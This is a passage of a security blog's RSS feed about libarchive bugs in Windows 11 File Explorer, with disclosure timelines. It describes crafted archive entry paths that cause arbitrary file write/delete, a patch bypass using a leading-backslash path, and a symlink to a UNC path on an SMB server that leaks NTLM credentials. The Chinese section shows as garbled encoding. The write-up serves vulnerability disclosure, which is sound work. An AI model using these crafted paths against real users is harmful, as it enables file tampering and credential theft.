&lt;p&gt;é™¤äº†å›å ±ä¸Šè¿°å…©å€‹ã€ŒHalf-dayã€ä¹‹å¤–ï¼Œåˆ¥å¿˜äº†æˆ‘å€‘é‚„æœ‰å¦å¤–å›å ±ä¸‰å€‹ 0-day æ¼æ´ï¼Œå®ƒå€‘å€‹åˆ¥æ˜¯ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å¾®è»Ÿå·²ç¶“ä¿®å¾©çš„ RCEï¼šCVE-2024-26256
    &lt;ul&gt;
      &lt;li&gt;4/27 å›å ±&lt;/li&gt;
      &lt;li&gt;8/14 ä¿®è£œ&lt;/li&gt;
      &lt;li&gt;9/28 é—œé–‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;filter_audio ä¸­çš„ oob read
    &lt;ul&gt;
      &lt;li&gt;3/20 å›å ±&lt;/li&gt;
      &lt;li&gt;4/29 ä¿®è£œ&lt;/li&gt;
      &lt;li&gt;9/28 é—œé–‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;filter_delta ä¸­çš„ oob read
    &lt;ul&gt;
      &lt;li&gt;3/20 å›å ±&lt;/li&gt;
      &lt;li&gt;4/29 ä¿®è£œ&lt;/li&gt;
      &lt;li&gt;9/28 é—œé–‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨å›å ±å¾Œçš„æ•¸å€‹æœˆï¼Œä»–å€‘çµ‚æ–¼ç²å¾—ä¿®å¾©ï¼Œé€™æ™‚å·²ç¶“æ˜¯ä¹æœˆï¼š
&lt;img src=&quot;/assets/img/blog/20250212/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;half-day-çš„è¿´ç’°è¤‡æ²“&quot;&gt;Half-day çš„è¿´ç’°è¤‡æ²“&lt;/h4&gt;

&lt;p&gt;å…¶ä¸­è¼ƒåš´é‡çš„æ˜¯æˆ‘å€‘å·²ç¶“å›å ±çµ¦å¾®è»Ÿçš„æ¼æ´ CVE-2024-26256ï¼Œå¾®è»Ÿåœ¨å››æœˆæ™‚ä¾¿å·²ç¶“ä¿®å¾©ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä¸‰æœˆå›å ±æ¼æ´çš„åŒæ™‚ï¼Œæˆ‘å€‘æœ‰è©¢å• MSRC æ˜¯å¦æœƒå°‡ CVE-2024-26256 çš„ patch æäº¤åˆ° libarchive çš„ GitHub repositoryï¼Œç¬¬ä¸€æ™‚é–“æ²’æœ‰ç²å¾—å›æ‡‰ã€‚åœ¨å¾®è»Ÿ patch CVE-2024-26256 ä¹‹å¾Œæˆ‘å€‘åˆæå•äº†ä¸€æ¬¡ï¼Œæƒ³ç¢ºå®šä»–å€‘æ˜¯å¦æœ‰å°‡è©²æ¼æ´çš„è³‡è¨ŠåŒæ­¥çµ¦ libarchive çš„ maintainersï¼ŒMSRC èªªï¼šã€Œå¦‚æœä½ é¡˜æ„çš„è©±ï¼Œæˆ‘å€‘é¼“å‹µä½ é–‹ä¸€å€‹ç¨ç«‹çš„ GitHub issueã€‚ã€ç‚ºäº†é¿å…ã€ŒHalf-dayã€æƒ…æ³ç™¼ç”Ÿï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿåœ¨æ”¶åˆ°è¨Šæ¯å¾Œé¦¬ä¸Šåˆ° libarchive çš„ Security Advisory é–‹äº†ä¸€å€‹ issueï¼š
&lt;img src=&quot;/assets/img/blog/20250212/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œã€ŒHalf-dayã€é‚„æ˜¯ç™¼ç”Ÿäº†ï¼Œå› ç‚ºå¤ªä¹…æ²’æœ‰äººå›æ‡‰ã€‚æ‰€ä»¥ä¸ƒæœˆæ™‚ï¼Œ&lt;a href=&quot;https://github.com/libarchive/libarchive/pull/2269&quot;&gt;æˆ‘å€‘è‡ªå·±ç™¼äº†ä¸€å€‹ PR &lt;/a&gt;å°‡å¾®è»Ÿçš„ patch ç§»æ¤éä¾†ï¼Œé›–ç„¶ä¸ç¢ºå®šé€™å€‹ä¿®è£œæ–¹å¼æ˜¯ä¸æ˜¯æœ€å¥½çš„ï¼Œä½†è‡³å°‘æ¯”æ²’æœ‰ä¿®è£œé‚„è¦å¼·ã€‚æ‰€ä»¥ï¼Œæ­·å²åˆé‡æ¼”äº†ä¸€æ¬¡ï¼Œå¾å››æœˆåˆ°ä¿®è£œå®Œæˆçš„ä¹æœˆä¹‹é–“ï¼Œæˆ‘å€‘åˆé™·å…¥äº†ã€ŒHalf-dayã€çš„æƒ…å¢ƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;é¤˜ä¸‹çš„å…©å€‹-0-day&quot;&gt;é¤˜ä¸‹çš„å…©å€‹ 0-day&lt;/h4&gt;

&lt;p&gt;çœ¼å°–çš„è®€è€…æˆ–è¨±å·²ç¶“æ³¨æ„åˆ°ï¼Œæˆ‘å€‘æ‰€å›å ±çš„ Security Advisory ä¸¦ä¸æ˜¯åœ¨ã€ŒPublishedã€çš„åˆ†é ä¸­ï¼Œè€Œæ˜¯ã€ŒClosedã€ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é™¤äº†å‰›æ‰æåˆ°çš„ CVE-2024-26256 ä¹‹å¤–ï¼Œå…¶é¤˜æ˜¯å…©å€‹å°šæœªç”³è«‹ CVE çš„è¶Šç•Œè®€å–æ¼æ´ã€‚é‡å°å·²ç¶“æœ‰ CVE ç·¨è™Ÿçš„ä¿®è£œï¼Œäººå€‘æœƒæ„è­˜åˆ°é€™æ˜¯ä¸€å€‹é—œæ–¼å®‰å…¨æ€§çš„ä¿®è£œã€‚ç„¶è€Œï¼Œç”±æ–¼å…¶ä»–å…©å€‹æ¼æ´ä¸¦ä¸ç‚ºäººæ‰€çŸ¥ï¼Œåƒ…ä¿®è£œå»ä¸é€šçŸ¥å…¶ä»–äººå®‰å…¨é¢¨éšªçš„å­˜åœ¨æ˜¯ä¸€ä»¶å±éšªçš„äº‹æƒ…ã€‚å°¤å…¶ï¼Œlibarchive æ˜¯ä¸€å€‹å»£æ³›ä½¿ç”¨çš„å‡½å¼åº«ï¼Œæœ‰è¨±è¨±å¤šå¤šçš„è»Ÿé«”æˆ–æœå‹™ä½¿ç”¨å®ƒï¼Œå°è‡´äººå€‘ä¸¦ä¸çŸ¥é“è‡ªå·±æ­£åœ¨ä½¿ç”¨ libarchiveã€‚é€™é¡è»Ÿé«”çš„ç›¸ä¾éˆå¯èƒ½ååˆ†é¾å¤§ä¸”è¤‡é›œï¼Œå¦‚æœé–‹ç™¼è€…æˆ–æ˜¯çµ‚ç«¯ä½¿ç”¨è€…æ²’æœ‰æ„è­˜åˆ°é€™æ˜¯ä¸€å€‹å®‰å…¨æ€§çš„æ›´æ–°ï¼Œé‚£éº¼ï¼Œè©²ä¿®è£œåœ¨æ•´å€‹ç›¸ä¾éˆä¸­å°‡æœƒæ¥µç‚ºç·©æ…¢åœ°å‚³æ’­ï¼Œé€²è€Œå¢åŠ æ½›åœ¨é¢¨éšªã€‚&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ï¼Œåœ¨ç¢ºèª libarchive å°‡ issue é—œé–‰ä¹‹å¾Œæˆ‘å€‘å°±ç«‹å³ç”³è«‹äº† CVE ç·¨è™Ÿï¼Œé€™å…©å€‹æ¼æ´åˆ†åˆ¥æ˜¯ &lt;a href=&quot;https://github.com/advisories/GHSA-rmj4-vvpv-4m33&quot;&gt;CVE-2024-48957&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://github.com/advisories/GHSA-9mw4-2ppr-4mcg&quot;&gt;CVE-2024-48958&lt;/a&gt;ï¼Œç•¶å®ƒå€‘è¢«ç™¼ä½ˆæ™‚ï¼Œå·²ç¶“æ˜¯åæœˆï¼Œè·é›¢ä¿®è£œç™¼å¸ƒçš„å››æœˆå·²ç¶“éå»äº†å…­å€‹æœˆã€‚&lt;/p&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;æœ¬æ–‡ä»‹ç´¹äº† Windows åœ¨æ¡ç”¨ libarchive ä»¥æ”¯æ´æ›´å¤šå£“ç¸®æª”æ¡ˆæ ¼å¼æ™‚ï¼Œæ‰€å¼•ç™¼çš„ä¸€äº›æ¼æ´èˆ‡æœ‰è¶£çš„ç‰¹æ€§ã€‚æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿå‘ libarchive å›å ±äº†æ•¸å€‹ 0-day æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—ï¼Œæˆ‘å€‘åœ¨ ClickHouse ä¸ŠæˆåŠŸåˆ©ç”¨äº†æˆ‘å€‘èªç‚ºä»‹æ–¼ 0-day èˆ‡ 1-day ä¹‹é–“çš„ã€ŒHalf-dayã€æ¼æ´ã€‚é€™æºæ–¼ Windows å°‡ libarchive fork å‡ºä¾†å¾Œï¼Œå°‡å…¶ç·¨è­¯ç‚ºé–‰æºçš„ archiveint.dllï¼Œä¸¦åœ¨ä¿®è£œè©² DLL å¾Œï¼Œæœªèƒ½åŠæ™‚é€šçŸ¥ libarchive çš„ç¶­è­·è€…ï¼Œæˆ–å°‡ä¿®è£œç¨‹å¼å›é¥‹åˆ° libarchive ä¸Šæ¸¸ï¼Œå¾è€Œå°è‡´äº†ã€ŒHalf-dayã€æ¼æ´çš„ç”¢ç”Ÿã€‚&lt;/p&gt;

&lt;p&gt;upstream è¼ƒæ™šç²å¾—ä¿®è£œçš„åŸå› ï¼Œé™¤äº†æºé€šå»¶é²ä¹‹å¤–ï¼Œä¹Ÿå› ç¼ºä¹å…¬é–‹å¯ç”¨çš„ä¿®è£œç¨‹å¼ã€‚ç¶­è­·è€…åœ¨ fork ç‰ˆæœ¬å·²ç¶“å®Œæˆä¿®è£œå¾Œï¼Œæ‰åœ¨æ¥ç²é€šå ±æ™‚é–‹å§‹è‘—æ‰‹è§£æ±ºå•é¡Œã€‚å› æ­¤ï¼Œå¾®è»Ÿåœ¨ä¿®è£œ fork ç‰ˆæœ¬çš„ libarchive å¾Œï¼Œé™¤äº†æ‡‰ä¸»å‹•é€šçŸ¥åŸå§‹ç¶­è­·è€…ï¼Œæ›´æ‡‰ç›´æ¥æäº¤ Pull Request (PR) è‡³ä¸Šæ¸¸ï¼Œä»¥å”åŠ©å®Œæˆä¿®è£œã€‚&lt;/p&gt;

&lt;p&gt;libarchive çš„ç¶­è­·è€…æ˜¯ä¸€ç¾¤å¿—é¡˜è€…ï¼Œè€Œä¸”å¯èƒ½æ²’æœ‰é ˜å–ä»»ä½•è–ªæ°´ã€‚è€Œé–‹æºç²¾ç¥ä¾¿æ˜¯äººäººçš†å¯ã€Œåˆ†äº«ã€åƒèˆ‡ã€è¡Œå‹•ã€ï¼Œå› æ­¤æˆ‘å€‘èªç‚ºï¼Œç ”ç©¶äººå“¡åœ¨æ¼æ´å›å ±çš„éç¨‹ä¸­ï¼Œé™¤äº†æä¾›æ¼æ´åˆ†æèˆ‡ PoC å¤–ï¼Œä¹Ÿæ‡‰è©²ç©æ¥µçš„æå‡ºä¿®è£œæ–¹æ¡ˆï¼Œå…±åŒç¶­è­·é–‹æºè»Ÿé«”çš„å®‰å…¨æ€§èˆ‡å“è³ªã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11/</link>
                <guid>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11</guid>
                <pubDate>Wed, 12 Feb 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>From Convenience to Contagion: The Half-Day Threat and Libarchive Vulnerabilities Lurking in Windows 11</title>
                <description>&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
&lt;p&gt;In the October 2023 update, Windows 11 introduced support for 11 additional compression formats, including RAR and 7z, allowing users to manage these types of files natively within File Explorer. The enhancement significantly improves convenience; however, it also introduces potential security risks. To support these various compression formats, Windows 11 utilizes the libarchive library, a well-established open-source library used across multiple operating systems like Linux, BSD, and macOS, and in major projects such as ClickHouse, Homebrew, and Osquery.&lt;/p&gt;

&lt;p&gt;The libarchive has been continuously fuzzed by Googleâ€™s OSS-Fuzz project, making it a time-tested library. However, its coverage in OSS-Fuzz has been less than ideal. In addition to the two remote code execution (RCE) vulnerabilities disclosed by Microsoft Offensive Research &amp;amp; Security Engineering (MORSE) in January, we have identified several vulnerabilities in libarchive through code review and fuzzing. These include a heap buffer overflow vulnerability in the RAR decompression and arbitrary file write and delete vulnerabilities due to insufficient checks of libarchiveâ€™s output on Windows. Additionally, in our presentation, we will reveal several interesting features that emerged from the integration of libarchive with Windows.&lt;/p&gt;

&lt;p&gt;And whenever vulnerabilities are discovered in widely-used libraries like libarchive, their risks often permeate every corner, making it difficult to estimate the potential hazards. Moreover, when Microsoft patches Windows, the corresponding fixes are not immediately merged into libarchive. This delay gives attackers the opportunity to exploit other projects using libarchive. For example, the vulnerabilities patched by Microsoft in January were not merged into libarchive until May, leaving countless applications exposed to risk for four months. The worst part is that the developers might not know the vulnerability details or even be aware of its existence. To illustrate this situation, we will use the vulnerabilities we reported to ClickHouse as an example to demonstrate how attackers can exploit the vulnerabilities while libarchive remains unpatched.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Before the KB5031455 update, Windows 11 only supported ZIP archives natively. In File Explorer, ZIP files are labeled â€œCompressed (zipped) Folder.â€ Users can double-click a ZIP file to view its contents:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Or, even better, add new files to the archive or open existing ones directly:
&lt;img src=&quot;/assets/img/blog/20250212/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When a user double-clicks a file inside a ZIP archive, File Explorer extracts it to a temporary folder with a randomly generated UUID under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%temp%&lt;/code&gt; directory. The file is accessed from this temporary location, and since itâ€™s a temporary file, it will be automatically deleted later:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;compressed-archived-folder&quot;&gt;Compressed Archived Folder&lt;/h3&gt;

&lt;p&gt;Next, after the KB5031455 update in October 2023, Windows 11 added support for 11 new archive file formats:
&lt;img src=&quot;/assets/img/blog/20250212/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This kind of file is labeled â€œCompressed Archive Folderâ€ by File Explorer:
&lt;img src=&quot;/assets/img/blog/20250212/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Curious about how Windows 11 supports these 11 new archive file formats, we began analyzing File Explorer and the related DLL files. The native support for ZIP in File Explorer is handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After the KB5031455 update, a new class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveFolder&lt;/code&gt; was added, distinct from the old &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CZipFolder&lt;/code&gt; class used to support ZIP Files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-vulnerability-cve-2024-26185&quot;&gt;First Vulnerability: CVE-2024-26185&lt;/h3&gt;

&lt;p&gt;Before firing up IDA, we first conducted black-box testing on the new â€œCompressed Archive Folderâ€ feature. When it comes to extracting files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; is a timeless trick.&lt;/p&gt;

&lt;p&gt;In the first test case, we constructed a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt;, compressed it into an RAR file, and then uploaded it to a Windows machine to open it by double-clicking. There was no Path Traversal; we only saw an empty folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We constructed a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; in the second test case. Because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123&lt;/code&gt; was canceled out by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt;, we only saw the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; solely in File Explore, and still no Path Traversal:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is also no Path Traversal in the corresponding temp folder:
&lt;img src=&quot;/assets/img/blog/20250212/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Excluding â€œdouble-clicking,â€ users will see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; if they right-click on â€œCompressed (zipped) Folderâ€ or â€œCompressed Archive Folderâ€ in File Explorer.
The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; will try to decompress the whole archive. Letâ€™s test â€œCompressed Archive Folderâ€ again with that:&lt;/p&gt;

&lt;p&gt;When using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt; is considered an attempt to escape to the parent directory, causing File Explorer to display an error:
&lt;img src=&quot;/assets/img/blog/20250212/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The extraction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; is a success, but we still only got the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt;.
&lt;img src=&quot;/assets/img/blog/20250212/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; decompresses the whole archive, we think we should also test the situation when the file name is an absolute path, for example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\poc\poc.txt&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is no error, but the folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; was renamed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt;. Thus, we now know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; will sanitize the input to avoid Path Traversal or Arbitrary File Write.
&lt;img src=&quot;/assets/img/blog/20250212/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But if one â€œdouble-clicksâ€ the RAR file, which contains a file with absolute path name, instead of â€œExtract All,â€ it will show a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Disk (C:)&lt;/code&gt; folder! The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; isnâ€™t replaced with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Besides that, everything seemed normal, even when we navigated to the innermost folder and opened the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; file:
&lt;img src=&quot;/assets/img/blog/20250212/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Except for the fact that the extra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; folder is under our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C&lt;/code&gt; volume!
&lt;img src=&quot;/assets/img/blog/20250212/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That means File Explorer considers here a place to put its temporary files; thus, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; file is also here, inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; folder:
&lt;img src=&quot;/assets/img/blog/20250212/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In other words, we have discovered an Arbitrary File Write vulnerability! Since this write operation aims to place temporary files, the files will be deleted after a while. Therefore, what we have actually found is an Arbitrary File Write/Delete vulnerability. But itâ€™s a shame that the permissions used for both writing and deleting are limited to the current userâ€™s privileges.&lt;/p&gt;

&lt;p&gt;Thatâ€™s &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185&quot;&gt;CVE-2024-26185&lt;/a&gt;, a funny yet useless vulnerability. To exploit it to create or delete a file in a specific location, you would need to create the exact same path structure within the archive and then trick the user into opening every folder and double-clicking the target file. Most people would probably find it suspicious halfway through the process.&lt;/p&gt;

&lt;p&gt;Well, that may be true, but according to the rules, Microsoft still has to pay me $1,000. Yay!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26185-root-cause&quot;&gt;CVE-2024-26185: Root Cause&lt;/h3&gt;

&lt;p&gt;The root cause of CVE-2024-26185 is the insufficient filtering of file names. After decompiling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;, we found it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; to sanitize the file name before decompression. The function replaces &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, when interacting with the â€œCompressed (zipped) Folderâ€ or â€œCompressed Archive Folder,â€ users have three methods to extract files, each triggering a different function:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Double-clicking a file inside the archive
    &lt;ul&gt;
      &lt;li&gt;Triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Double-clicking a cmd, bat, or exe file inside the archive
    &lt;ul&gt;
      &lt;li&gt;Triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractEntireArchive&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Right-clicking the archive and selecting â€œExtract Allâ€ from the menu
    &lt;ul&gt;
      &lt;li&gt;Triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveExtractWizard::ExtractToDestination&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All of them use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_next_header&lt;/code&gt; to get the file names in the archive, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; to sanitize the file name, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractArchiveEntry&lt;/code&gt; to actually extract the file. However, they forgot to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt;, which is triggered when â€œDouble-clicking a file inside the archive,â€ leading to the arbitrary file write and arbitrary file delete vulnerabilities.
&lt;img src=&quot;/assets/img/blog/20250212/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-38165-bypassing-the-patch-for-cve-2024-26185&quot;&gt;CVE-2024-38165: Bypassing the Patch for CVE-2024-26185&lt;/h3&gt;

&lt;p&gt;After Microsoft patched CVE-2024-26185, we randomly picked some PoCs created a while ago and executed them to check the patchâ€™s correctness. It turns out that some of our PoCs are still working!?&lt;/p&gt;

&lt;p&gt;In the patch, they add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; before 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt; to sanitize the file name. It looks perfect:
&lt;img src=&quot;/assets/img/blog/20250212/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, it can be easily bypassed byÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt;. How does that happen? Letâ€™s follow the code step by step. First, the file nameÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt;Â is passed intoÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt;. Since there are no invalid characters in the file name, the output is stillÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; is currently â€œextracting file to a temporary folder under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; to let users interact with it,â€ the file name should be concatenated with the path of the temporary folder to construct the destination of extraction:
&lt;img src=&quot;/assets/img/blog/20250212/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But here comes the problem, in Windows, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; are both considered as root. In other words, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; is currently concatenating two absolute paths! According to &lt;a href=&quot;https://github.com/microsoft/STL/blob/90820002693fe6eaaec2e55884472c654186207e/stl/inc/filesystem#L723&quot;&gt;the STL implemented by Microsoft&lt;/a&gt;, if two arguments of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;std::filesystem::operator/&lt;/code&gt; are both absolute paths, it will return the second argument directly. Thus, the functionâ€™s return value is  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\poc\poc.txt&lt;/code&gt;, causing a patch bypass.
&lt;img src=&quot;/assets/img/blog/20250212/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;symlink-ntlm-exfiltration&quot;&gt;Symlink NTLM Exfiltration&lt;/h3&gt;

&lt;p&gt;Of course, itâ€™s vulnerable without &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt;. But can we still exploit File Explorer even if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; is used correctly? This function only filters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt;, meaning &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; can still be used to construct a remote path. Could NTLM exfiltration still be possible? We attempted to construct paths such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\Mup\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While these are regular files, they only create a corresponding directory under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; volume (before the CVE-2024-38165 fix). However, if we create a symlink pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\poc\poc.txt&lt;/code&gt;, when the user either double-clicks the symlink or selects â€œExtract All,â€ File Explorer will attempt to communicate with the SMB server at that IP address, leading to an NTLM leak:&lt;/p&gt;

